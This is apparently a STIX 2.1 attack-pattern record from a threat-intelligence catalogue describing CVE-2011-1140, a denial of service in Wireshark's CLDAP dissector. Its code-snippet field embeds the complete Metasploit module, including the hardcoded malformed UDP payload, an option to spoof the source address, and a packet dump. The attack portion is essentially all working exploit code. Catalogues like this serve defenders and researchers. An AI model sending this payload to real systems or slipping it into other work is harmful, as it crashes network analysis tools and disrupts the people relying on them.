{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--2020db4b-c6ca-4109-b9cf-a1eeecd8ff12",
    "created": "2024-08-14T16:24:37.38068Z",
    "modified": "2024-08-14T16:24:37.380684Z",
    "name": "Wireshark CLDAP Dissector DOS",
    "description": " This module causes infinite recursion to occur within the CLDAP dissector by sending a specially crafted UDP packet. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/dos/wireshark/cldap.rb",
            "external_id": "cldap.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2011-1140"
        },
        {
            "source_name": "reference",
            "url": "https://www.wireshark.org/security/wnpa-sec-2011-04.html"
        },
        {
            "source_name": "reference",
            "url": "https://bugs.wireshark.org/bugzilla/show_bug.cgi?id=5717"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::Udp\n  include Msf::Auxiliary::Dos\n\n  def initialize(info = {})\n    super( update_info(info,\n      'Name'           => 'Wireshark CLDAP Dissector DOS',\n      'Description'    => %q{\n        This module causes infinite recursion to occur within the\n        CLDAP dissector by sending a specially crafted UDP packet.\n      },\n      'Author'         => ['joernchen <joernchen[at]phenoelit.de> (Phenoelit)'],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          [ 'CVE', '2011-1140'],\n          [ 'OSVDB', '71552'],\n          [ 'URL', 'https://www.wireshark.org/security/wnpa-sec-2011-04.html' ],\n          [ 'URL', 'https://bugs.wireshark.org/bugzilla/show_bug.cgi?id=5717' ],\n        ],\n      'DisclosureDate' => '2011-03-01'))\n\n    register_options([\n      OptInt.new('RPORT', [true, 'The destination port', 389]),\n      OptAddress.new('SHOST', [false, 'This option can be used to specify a spoofed source address', nil])\n    ])\n  end\n\n  def run\n    connect_udp\n    cldap_payload = \"\\x30\\x81\\xa2\\x02\\x01\\x01\\x64\\x81\\x9c\\x04\\x00\\x30\\x81\\x97\\x30\\x81\"+\n      \"\\x94\\x04\\x08\\x6e\\x65\\x74\\x6c\\x6f\\x67\\x6f\\x6e\\x31\\x81\\x87\\x04\\x81\"+\n      \"\\x84\\x17\\x00\\x00\\x00\\xfd\\x03\\x00\\x00\\xda\\xae\\x52\\xd0\\x2f\\xb4\\xa9\"+\n      \"\\x48\\x8b\\x16\\x4e\\xbc\\x51\\xf9\\x60\\xb4\\xc0\\x1a\\xc0\\x18\\x0e\\x63\\x6f\"+\n      \"\\x6e\\x74\\x61\\x63\\x74\\x2d\\x73\\x61\\x6d\\x62\\x61\\x34\\xc0\\x18\\x0a\\x43\"+\n      \"\\x4f\\x4e\\x54\\x41\\x43\\x54\\x44\\x4f\\x4d\\x00\\x10\\x5c\\x5c\\x43\\x4f\\x4e\"+\n      \"\\x54\\x41\\x43\\x54\\x2d\\x53\\x41\\x4d\\x42\\x41\\x34\\x00\\x00\\x00\\x00\\xc0\"+\n      \"\\x61\\x05\\x00\\x00\\x00\\xff\\xff\\xff\\xff\\x30\\x0c\\x02\\x01\\x01\\x65\\x07\"+\n      \"\\x0a\\x01\\x00\\x04\\x00\\x04\\x00\"\n    print_status(\"Sending malformed CLDAP packet to #{rhost}\")\n    udp_sock.put(cldap_payload)\n  end\nend\n=begin\nPacket Dump:\n  0000050: b054 3081 a202 0101 6481 9c04 0030 8197  .T0.....d....0..\n  0000060: 3081 9404 086e 6574 6c6f 676f 6e31 8187  0....netlogon1..\n  0000070: 0481 8417 0000 00fd 0300 00da ae52 d02f  .............R./\n  0000080: b4a9 488b 164e bc51 f960 b4c0 1ac0 180e  ..H..N.Q.`......\n  0000090: 636f 6e74 6163 742d 7361 6d62 6134 c018  contact-samba4..\n  00000a0: 0a43 4f4e 5441 4354 444f 4d00 105c 5c43  .CONTACTDOM..\\\\C\n  00000b0: 4f4e 5441 4354 2d53 414d 4241 3400 0000  ONTACT-SAMBA4...\n  00000c0: 00c0 6105 0000 00ff ffff ff30 0c02 0101  ..a........0....\n  00000d0: 6507 0a01 0004 0004 00                   e........\n=end\n",
    "x_mitre_disclosure_date": "2011-03-01"
}